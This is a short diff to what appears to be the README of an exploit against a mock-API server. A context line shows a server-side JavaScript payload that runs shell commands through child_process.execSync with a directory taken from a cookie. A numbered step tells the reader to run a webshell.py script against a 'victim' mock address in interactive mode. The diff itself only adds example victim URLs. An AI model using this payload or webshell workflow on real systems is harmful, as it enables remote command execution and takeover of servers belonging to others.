@@ -23,7 +23,7 @@ mockJson = process.mainModule.require("child_process").execSync("cd "+cookie.dir
 5.  use python script to connect webshell and interactive
 
 ```bash
-python3 webshell.py {mock address like: } -i # interactive mode
+python3 webshell.py {mock address like: http://whereisthevictim/mock/222/test/test } -i # interactive mode
 # or
-python3 webshell.py {mock address like: } {cmd dir,you can use "."} {command location}
+python3 webshell.py {mock address like: http://whereisthevictim/mock/222/test/test} {cmd dir,you can use "."} {command location}
 ```
